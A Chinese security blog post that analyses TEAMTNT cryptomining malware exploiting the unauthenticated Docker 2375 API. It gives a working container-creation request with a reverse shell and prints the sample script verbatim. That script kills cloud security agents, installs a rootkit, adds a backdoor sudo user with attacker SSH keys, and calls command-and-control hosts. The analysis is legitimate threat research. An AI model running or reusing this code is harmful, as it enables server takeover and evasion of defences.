@@ -1,0 +1,578 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="396829434c4453ccafa957aab05175f3">前言</h2>
+<p>了解过docker容器安全的大佬们应该知道docker的2375端口是存在未授权安全问题的，前段时间在我们团队推进云安全知识的时候，无意间在zoomeye发现TEAMTNT针对阿里云和腾讯云专门写的一个恶意挖矿脚本。鉴于这个样本还是写的挺有意思的<del>不是二进制文件所以相对水一点</del>，所以我们简略的分析<del>胡乱猜测</del>了一下TEAMTNT是如何利用2375端口恶意挖矿和后续的初步内网渗透过程。</p>
+<h2 data-content="1" id="f138a2d766bf89948ad47743b1fa344d">Docker 2375利用方式</h2>
+<p>传统的利用方式通过<code>-H tcp://ip:2375</code>远程连进未授权的docker api，然后重新run一个新的实例。</p>
+<p>再借助<code>-v  /:/mnt</code>将物理服务器的根目录挂载到实例中，然后把ssh公钥写入物理服务器的<code>/root/.ssh/authorized_keys文</code>实现提权，或者将反弹shell的脚本写入<code>/etc/crontab</code>提权。</p>
+<p>那有没有更骚<del>费劲</del>的操作呢？答案是有的。docker api本身是个http服务，官方的文档中有多种操作可以实现新建一个镜像。</p>
+<p>这里借用了<code>phith0n</code>大佬之前的<code>容器与云的碰撞——一次对 MinIO 的测试</code>一文中的思路，我们翻阅了一下官方的文档，找到了一种利用docker api在不影响生产环境下的稳定反弹shell且能mount主目录的一个api <code>/containers/create</code>。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210806213422-024633b2-f6bb-1.png"/></p>
+<p><code>/containers/create</code>传递的参数中有我们很熟悉Cmd，Tty，Binds参数，跟run命令基本可以做到一一对照。</p>
+<pre><code>POST /containers/create HTTP/1.1
+Host: ip:port
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 579
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+{
+  "Hostname": "",
+  "Domainname": "",
+  "User": "",
+  "AttachStdin": false,
+  "AttachStdout": true,
+  "AttachStderr": true,
+  "Tty": true,
+  "OpenStdin": false,
+  "StdinOnce": false,
+  "Detach": true,
+  "Image": "ubuntu:latest", #使用的基础镜像
+  "Cmd":  ["/bin/bash", "-c", "bash -i&gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1;while true;do echo hello world;sleep 1;done"], #创建启动命令
+  "Labels": {
+    "com.example.vendor": "Acme",
+    "com.example.license": "GPL",
+    "com.example.version": "1.0"
+  },
+  "HostConfig": {
+            "Binds": [
+                "/:/mnt" #挂载根目录到mnt下
+            ]
+  }
+}</code></pre>
+<p>虽然这个跟run命令参数很想，但<code>Image</code>参数如果是本地不存在依旧无法成功创建，因此我们需要创建一个镜像出来，用<code>/images/create</code>远程拉一个下来。（实战环境中也可以直接用已经存在的镜像）</p>
+<div class="highlight"><pre><span></span>curl -X POST <span class="s2">"http://ip/images/create?fromImage=ubuntu&amp;tag=latest"</span>
+</pre></div>
+<p>最后用<code>/containers/{id}/start</code>启动刚才用ubuntu创建的实例</p>
+<div class="highlight"><pre><span></span>curl -X POST <span class="s2">"http://ip/containers/{id}/start"</span>
+</pre></div>
+<p>完美，现在我们能愉悦的继续从传统的攻击流程继续了。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210806213443-0f2dbb68-f6bb-1.png"/></p>
+<h2 data-content="1" id="948c5c437d1e283ae654f7a84bfe0bda">样本分析</h2>
+<p>回到正题，鉴于TEAMTNT也没有故意隐藏自己的ip，因此不好确定他们使用哪种方式利用的docker api未授权漏洞，但来都来了，送上门的样本还是要分析到底的，顺便也研究一下他们的进攻思路。</p>
+<p>从我们收集到的样本脚本中，TEAMTNT会先在创建的docker容器下载的cronb.sh脚本，然后其在部署挖矿环境后会继续下载和运行剩余的两个扫描脚本，脚本主要作用如下：</p>
+<ol>
+<li>cronb.sh<ul>
+<li>剔除保护：停用相关云安全检测工具</li>
+<li>结束其他挖矿程序</li>
+<li>修改系统设置</li>
+<li>安装挖矿软件，挖门罗币</li>
+<li>终止自己的挖矿进程</li>
+<li>实现免密登录</li>
+<li>下载后续脚本cronis.sh</li>
+</ul>
+</li>
+<li>cronis.sh<ul>
+<li>下载软件依赖，安装pnscan，masscan</li>
+<li>安装cronscan并执行</li>
+</ul>
+</li>
+<li>cronscan<ul>
+<li>启动扫描器并下载cronrs.sh</li>
+</ul>
+</li>
+<li>cronrs.sh<ul>
+<li>运行扫描器查找内网和部分腾讯云及阿里云ip段的redis未授权漏洞扩大攻击范围</li>
+</ul>
+</li>
+</ol>
+<h3 data-content="1" id="dd200bd246e846c849607458680c26df">样本分析——cronb.sh</h3>
+<h4 data-content="1" id="67691cf962da261139d670b22659b8d9">剔除阿里云的保护机制</h4>
+<p>stop_aegis_pkill()</p>
+<div class="highlight"><pre><span></span>stop_aegis_pkill<span class="o">(){</span>
+    pkill -9 AliYunDun &gt;/dev/null <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+    pkill -9 AliHids &gt;/dev/null <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+    pkill -9 AliHips &gt;/dev/null <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+    pkill -9 AliNet &gt;/dev/null <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+    pkill -9 AliSecGuard &gt;/dev/null <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+    pkill -9 AliYunDunUpdate &gt;/dev/null <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+
+    /usr/local/aegis/AliNet/AliNet --stopdriver
+    /usr/local/aegis/alihips/AliHips --stopdriver
+    /usr/local/aegis/AliSecGuard/AliSecGuard --stopdriver
+    <span class="nb">printf</span> <span class="s2">"%-40s %40s\n"</span> <span class="s2">"Stopping aegis"</span> <span class="s2">"[  OK  ]"</span>
+<span class="o">}</span>
+</pre></div>
+<p>remove_aegis()</p>
+<div class="highlight"><pre><span></span><span class="nv">AEGIS_INSTALL_DIR</span><span class="o">=</span><span class="s2">"/opt/aegis"</span>
+<span class="c1">#aegis:阿里云云服务器安骑士</span>
+remove_aegis<span class="o">(){</span>
+<span class="k">if</span> <span class="o">[</span> -d <span class="s2">"</span><span class="si">${</span><span class="nv">AEGIS_INSTALL_DIR</span><span class="si">}</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span><span class="k">then</span>
+    umount <span class="si">${</span><span class="nv">AEGIS_INSTALL_DIR</span><span class="si">}</span>/aegis_debug
+    rm -rf <span class="si">${</span><span class="nv">AEGIS_INSTALL_DIR</span><span class="si">}</span>/aegis_client
+    rm -rf <span class="si">${</span><span class="nv">AEGIS_INSTALL_DIR</span><span class="si">}</span>/aegis_update
+    rm -rf <span class="si">${</span><span class="nv">AEGIS_INSTALL_DIR</span><span class="si">}</span>/alihids
+    rm -rf <span class="si">${</span><span class="nv">AEGIS_INSTALL_DIR</span><span class="si">}</span>/globalcfg/domaincfg.ini
+<span class="k">fi</span>
+<span class="o">}</span>
+</pre></div>
+<p>uninstall_service()</p>
+<div class="highlight"><pre><span></span>uninstall_service<span class="o">()</span> <span class="o">{</span>
+
+   <span class="k">if</span> <span class="o">[</span> -f <span class="s2">"/etc/init.d/aegis"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+        /etc/init.d/aegis stop  &gt;/dev/null <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+        rm -f /etc/init.d/aegis 
+   <span class="k">fi</span>
+
+    <span class="k">if</span> <span class="o">[</span> <span class="nv">$LINUX_RELEASE</span> <span class="o">=</span> <span class="s2">"GENTOO"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+        rc-update del aegis default <span class="m">2</span>&gt;/dev/null
+        <span class="k">if</span> <span class="o">[</span> -f <span class="s2">"/etc/runlevels/default/aegis"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+            rm -f <span class="s2">"/etc/runlevels/default/aegis"</span> &gt;/dev/null <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">;</span>
+        <span class="k">fi</span>
+    <span class="k">elif</span> <span class="o">[</span> -f /etc/init.d/aegis <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+         /etc/init.d/aegis  uninstall
+        <span class="k">for</span> <span class="o">((</span><span class="nv">var</span><span class="o">=</span><span class="m">2</span><span class="p">;</span> var&lt;<span class="o">=</span><span class="m">5</span><span class="p">;</span> var++<span class="o">))</span> <span class="k">do</span>
+            <span class="k">if</span> <span class="o">[</span> -d <span class="s2">"/etc/rc</span><span class="si">${</span><span class="nv">var</span><span class="si">}</span><span class="s2">.d/"</span> <span class="o">]</span><span class="p">;</span><span class="k">then</span>
+                 rm -f <span class="s2">"/etc/rc</span><span class="si">${</span><span class="nv">var</span><span class="si">}</span><span class="s2">.d/S80aegis"</span>
+            <span class="k">elif</span> <span class="o">[</span> -d <span class="s2">"/etc/rc.d/rc</span><span class="si">${</span><span class="nv">var</span><span class="si">}</span><span class="s2">.d"</span> <span class="o">]</span><span class="p">;</span><span class="k">then</span>
+                rm -f <span class="s2">"/etc/rc.d/rc</span><span class="si">${</span><span class="nv">var</span><span class="si">}</span><span class="s2">.d/S80aegis"</span>
+            <span class="k">fi</span>
+        <span class="k">done</span>
+    <span class="k">fi</span>
+
+<span class="o">}</span>
+</pre></div>
+<p>剔除阿里云监控插件</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="o">[</span> -f /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+  /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop <span class="o">&amp;&amp;</span> /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove <span class="o">&amp;&amp;</span> rm -rf /usr/local/cloudmonitor  
+<span class="k">else</span>
+  <span class="nb">export</span> <span class="nv">ARCHD</span><span class="o">=</span>amd64
+  <span class="k">if</span> <span class="o">[</span> -f /usr/local/cloudmonitor/CmsGoAgent.linux-<span class="si">${</span><span class="nv">ARCHD</span><span class="si">}</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+    /usr/local/cloudmonitor/CmsGoAgent.linux-<span class="si">${</span><span class="nv">ARCHD</span><span class="si">}</span> stop <span class="o">&amp;&amp;</span> /usr/local/cloudmonitor/CmsGoAgent.linux-<span class="si">${</span><span class="nv">ARCHD</span><span class="si">}</span> uninstall <span class="o">&amp;&amp;</span> rm -rf /usr/local/cloudmonitor 
+  <span class="k">else</span>
+    <span class="nb">echo</span> <span class="s2">"ali cloud monitor not running"</span>
+  <span class="k">fi</span>
+<span class="k">fi</span>
+</pre></div>
+<h4 data-content="1" id="eba4a73185589262a32129f9b3edee93">剔除腾讯云的保护机制</h4>
+<div class="highlight"><pre><span></span><span class="k">elif</span> ps aux <span class="p">|</span> grep -i <span class="s1">'[y]unjing'</span><span class="p">;</span> <span class="k">then</span>
+  /usr/local/qcloud/stargate/admin/uninstall.sh
+  /usr/local/qcloud/YunJing/uninst.sh
+  /usr/local/qcloud/monitor/barad/admin/uninstall.sh
+<span class="k">fi</span>
+</pre></div>
+<h4 data-content="1" id="664b68fa0429c1ddc1ab1171a2a902f8">停用linux两大安全机制，SElinux和apparmor</h4>
+<p>定义变量MOxmrigMOD和MOxmrigSTOCK，其实是xmrig。定义配置文件url和miner的url，还有两个备份文件，钱包地址和恶意脚本版本。</p>
+<div class="highlight"><pre><span></span>setenforce <span class="m">0</span>
+<span class="nb">echo</span> <span class="nv">SELINUX</span><span class="o">=</span>disabled &gt;/etc/selinux/config
+service apparmor stop
+systemctl disable apparmor
+service aliyun.service stop
+systemctl disable aliyun.service
+
+
+<span class="nv">MOxmrigMOD</span><span class="o">=</span>http://112.253.11.38/mid.jpg
+<span class="nv">MOxmrigSTOCK</span><span class="o">=</span>http://112.253.11.38/mid.jpg
+<span class="nv">miner_url</span><span class="o">=</span>https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-static-x64.tar.gz
+<span class="nv">miner_url_backup</span><span class="o">=</span>http://oracle.zzhreceive.top/b2f628/father.jpg
+<span class="nv">config_url</span><span class="o">=</span>http://oracle.zzhreceive.top/b2f628/cf.jpg
+<span class="nv">config_url_backup</span><span class="o">=</span>http://oracle.zzhreceive.top/b2f628/cf.jpg
+<span class="nv">WALLET</span><span class="o">=</span>43Xbgtym2GZWBk87XiYbCpTKGPBTxYZZWi44SWrkqqvzPZV6Pfmjv3UHR6FDwvPgePJyv9N5PepeajfmKp1X71EW7jx4Tpz.jokerd
+<span class="nv">VERSION</span><span class="o">=</span><span class="m">2</span>.9
+</pre></div>
+<h4 data-content="1" id="d43dfe175a3f1871356fd3c3823666b8">安装<a href="https://github.com/m0nad/Diamorphine" target="_blank">Diamorphine</a>用以隐藏进程和提权</h4>
+<p>将文件提前base64编码放入bash脚本，之后再输出成tar包解压安装</p>
+<div class="highlight"><pre><span></span><span class="k">function</span> installdia<span class="o">(){</span>
+
+<span class="nv">DIA_TAR</span><span class="o">=</span><span class="s1">'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'</span>
+
+chattr -ia / /etc/ /tmp/ /var/ /var/tmp/ <span class="m">2</span>&gt;/dev/null
+chattr -R -ia /tmp/ /var/tmp/ <span class="m">2</span>&gt;/dev/null
+chmod <span class="m">1777</span> /tmp/ /var/tmp/ <span class="m">2</span>&gt;/dev/null
+
+
+<span class="k">if</span> <span class="nb">type</span> yum <span class="m">2</span>&gt;/dev/null <span class="m">1</span>&gt;/dev/null<span class="p">;</span> <span class="k">then</span> yum clean all <span class="p">;</span> yum -y install gcc make kmod elfutils-libelf-devel<span class="p">;</span> yum -y install <span class="s2">"kernel-devel-uname-r == </span><span class="k">$(</span>uname -r<span class="k">)</span><span class="s2">"</span> <span class="p">;</span> <span class="k">fi</span>
+<span class="k">if</span> <span class="nb">type</span> apt <span class="m">2</span>&gt;/dev/null <span class="m">1</span>&gt;/dev/null<span class="p">;</span> <span class="k">then</span> apt update --fix-missing <span class="p">;</span> apt-get -y install gcc make kmod libelf-dev libelf-devel<span class="p">;</span> apt-get -y install linux-headers-<span class="k">$(</span>uname -r<span class="k">)</span>  <span class="p">;</span> <span class="k">fi</span>
+<span class="k">if</span> <span class="nb">type</span> apk <span class="m">2</span>&gt;/dev/null <span class="m">1</span>&gt;/dev/null<span class="p">;</span> <span class="k">then</span> apk update <span class="m">2</span>&gt;/dev/null <span class="m">1</span>&gt;/dev/null<span class="p">;</span> apk add linux-headers <span class="m">2</span>&gt;/dev/null <span class="p">;</span> <span class="k">fi</span>
+
+<span class="k">if</span> <span class="o">[</span> ! -d <span class="s2">"/var/tmp/.../dia/"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span> mkdir -p /var/tmp/.../dia/ <span class="p">;</span> <span class="k">fi</span>
+<span class="nb">echo</span> <span class="nv">$DIA_TAR</span> <span class="p">|</span> base64 -d &gt; /var/tmp/.../dia/dia.tar.gz
+tar xvf /var/tmp/.../dia/dia.tar.gz -C /var/tmp/.../dia/
+rm -f /var/tmp/.../dia/dia.tar.gz
+<span class="nb">cd</span> /var/tmp/.../dia/
+make
+<span class="o">}</span>
+</pre></div>
+<h4 data-content="1" id="6eb3e6f355f8c80fc4b6dadb033f2f10">实现免密登录</h4>
+<div class="highlight"><pre><span></span><span class="k">function</span> makesshaxx<span class="o">(){</span>
+<span class="nb">echo</span> <span class="s2">"begin makessh"</span>
+<span class="nv">RSAKEY</span><span class="o">=</span><span class="s2">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver"</span>
+grep -q hilde /etc/passwd <span class="o">||</span> chattr -ia /etc/passwd<span class="p">;</span> 
+grep -q hilde /etc/passwd <span class="o">||</span> tntrecht -ia /etc/passwd<span class="p">;</span> 
+grep -q hilde /etc/passwd <span class="o">||</span> <span class="nb">echo</span> <span class="s1">'hilde:x:1000:1000::/home/hilde:/bin/bash'</span> &gt;&gt; /etc/passwd<span class="p">;</span> chattr +ia /etc/passwd<span class="p">;</span> tntrecht +ia /etc/passwd
+grep -q hilde /etc/shadow <span class="o">||</span> chattr -ia /etc/shadow<span class="p">;</span> 
+grep -q hilde /etc/shadow <span class="o">||</span> tntrecht -ia /etc/shadow<span class="p">;</span> 
+grep -q hilde /etc/shadow <span class="o">||</span> <span class="nb">echo</span> <span class="s1">'hilde:$6$7n/iy4R6znS2iq0J$QjcECLSqMMiUUeHR4iJmkHLzAwgoNRhCC87HI3df95nZH5569TKwJEN2I/lNanPe0vhsdgfILPXedlWlZn7lz0:18461:0:99999:7:::'</span> &gt;&gt; /etc/shadow<span class="p">;</span> chattr +ia /etc/shadow<span class="p">;</span> tntrecht +ia /etc/shadow
+grep -q hilde /etc/sudoers <span class="o">||</span> chattr -ia /etc/sudoers<span class="p">;</span> 
+grep -q hilde /etc/sudoers <span class="o">||</span> tntrecht -ia /etc/sudoers<span class="p">;</span> 
+grep -q hilde /etc/sudoers <span class="o">||</span> <span class="nb">echo</span> <span class="s1">'hilde  ALL=(ALL:ALL) ALL'</span> &gt;&gt; /etc/sudoers<span class="p">;</span> chattr +i /etc/sudoers<span class="p">;</span> tntrecht +i /etc/sudoers
+
+mkdir /home/hilde/.ssh/ -p  
+touch /home/hilde/.ssh/authorized_keys  
+touch /home/hilde/.ssh/authorized_keys2  
+chmod <span class="m">600</span> /home/hilde/.ssh/authorized_keys
+chmod <span class="m">600</span> /home/hilde/.ssh/authorized_keys2
+grep -q root@puppetserver /home/hilde/.ssh/authorized_keys <span class="o">||</span> chattr -ia /home/hilde/.ssh/authorized_keys<span class="p">;</span> 
+grep -q root@puppetserver /home/hilde/.ssh/authorized_keys <span class="o">||</span> tntrecht -ia /home/hilde/.ssh/authorized_keys<span class="p">;</span> 
+grep -q root@puppetserver /home/hilde/.ssh/authorized_keys <span class="o">||</span> <span class="nb">echo</span> <span class="nv">$RSAKEY</span> &gt; /home/hilde/.ssh/authorized_keys<span class="p">;</span> chattr +ia /home/hilde/.ssh/authorized_keys<span class="p">;</span> tntrecht +ia /home/hilde/.ssh/authorized_keys<span class="p">;</span>
+grep -q root@puppetserver /home/hilde/.ssh/authorized_keys2 <span class="o">||</span> chattr -ia /home/hilde/.ssh/authorized_keys2<span class="p">;</span> 
+grep -q root@puppetserver /home/hilde/.ssh/authorized_keys2 <span class="o">||</span> tntrecht -ia /home/hilde/.ssh/authorized_keys2<span class="p">;</span> 
+grep -q root@puppetserver /home/hilde/.ssh/authorized_keys2 <span class="o">||</span> <span class="nb">echo</span> <span class="nv">$RSAKEY</span> &gt; /home/hilde/.ssh/authorized_keys2<span class="p">;</span> chattr +ia /home/hilde/.ssh/authorized_keys2<span class="p">;</span> tntrecht +ia /home/hilde/.ssh/authorized_keys2<span class="p">;</span>
+mkdir /root/.ssh/ -p  
+touch /root/.ssh/authorized_keys  
+touch /root/.ssh/authorized_keys2
+chmod <span class="m">600</span> /root/.ssh/authorized_keys
+chmod <span class="m">600</span> /root/.ssh/authorized_keys2
+grep -q root@puppetserver /root/.ssh/authorized_keys <span class="o">||</span> chattr -ia /root/.ssh/authorized_keys<span class="p">;</span> 
+grep -q root@puppetserver /root/.ssh/authorized_keys <span class="o">||</span> tntrecht -ia /root/.ssh/authorized_keys<span class="p">;</span> 
+grep -q root@puppetserver /root/.ssh/authorized_keys <span class="o">||</span> <span class="nb">echo</span> <span class="nv">$RSAKEY</span> &gt;&gt; /root/.ssh/authorized_keys<span class="p">;</span> chattr +ia /root/.ssh/authorized_keys<span class="p">;</span> tntrecht +ia /root/.ssh/authorized_keys
+grep -q root@puppetserver /root/.ssh/authorized_keys2 <span class="o">||</span> chattr -ia /root/.ssh/authorized_keys2<span class="p">;</span> 
+grep -q root@puppetserver /root/.ssh/authorized_keys2 <span class="o">||</span> tntrecht -ia /root/.ssh/authorized_keys2<span class="p">;</span> 
+grep -q root@puppetserver /root/.ssh/authorized_keys2 <span class="o">||</span> <span class="nb">echo</span> <span class="nv">$RSAKEY</span> &gt; /root/.ssh/authorized_keys2<span class="p">;</span> chattr +ia /root/.ssh/authorized_keys2<span class="p">;</span> tntrecht +ia /root/.ssh/authorized_keys2
+<span class="o">}</span>
+</pre></div>
+<p>测试ssh连通性，包括测试加密功能，登录认证功能，登录认证是否为root，如果失败则报错，成功则不输出，这边有些奇奇怪怪的cur之类的命令，在下一个脚本样本中有讲</p>
+<div class="highlight"><pre><span></span><span class="k">function</span> checksshkeys<span class="o">(){</span>
+<span class="k">if</span> <span class="o">[</span> -f /var/tmp/.system/<span class="o">[</span>ext4<span class="o">]</span>.log <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+curl  http://oracle.zzhreceive.top/b2f628/cryptostart &gt;&gt;/dev/null
+cur http://oracle.zzhreceive.top/b2f628/cryptostart &gt;&gt;/dev/null
+cd1 http://oracle.zzhreceive.top/b2f628/cryptostart &gt;&gt;/dev/null
+TNTcurl http://oracle.zzhreceive.top/b2f628/cryptostart &gt;&gt;/dev/null
